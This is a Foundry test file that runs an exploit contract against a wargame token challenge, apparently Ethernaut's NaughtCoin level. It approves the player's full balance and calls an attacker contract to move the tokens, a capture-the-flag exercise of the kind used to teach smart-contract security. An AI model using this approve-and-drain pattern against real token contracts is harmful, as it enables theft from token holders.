// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import "../src/15-NaughtCoin.sol";

contract NaughtCoinTest is Test {
    INaughtCoin public naughtCoinInstance;
    NaughtCoin public exploiter;

    function setUp() public {
        address instanceAddress = 0x4971cC3759Def60F44A31548d2eabeaF4730C455;
        naughtCoinInstance = INaughtCoin(instanceAddress);
        exploiter = new NaughtCoin(instanceAddress);
    }

    function test_exploit() public {
        vm.prank(0xBF8641831D15c2701BA122981C3D7A6A2533ea48, 0xBF8641831D15c2701BA122981C3D7A6A2533ea48);
        uint256 amount = naughtCoinInstance.balanceOf(msg.sender);
        bool success = naughtCoinInstance.approve(address(this), amount);
        require(success, "Failed to approve");
        exploiter.attack(address(this));
        assert(naughtCoinInstance.balanceOf(address(this)) == amount);
    }
}
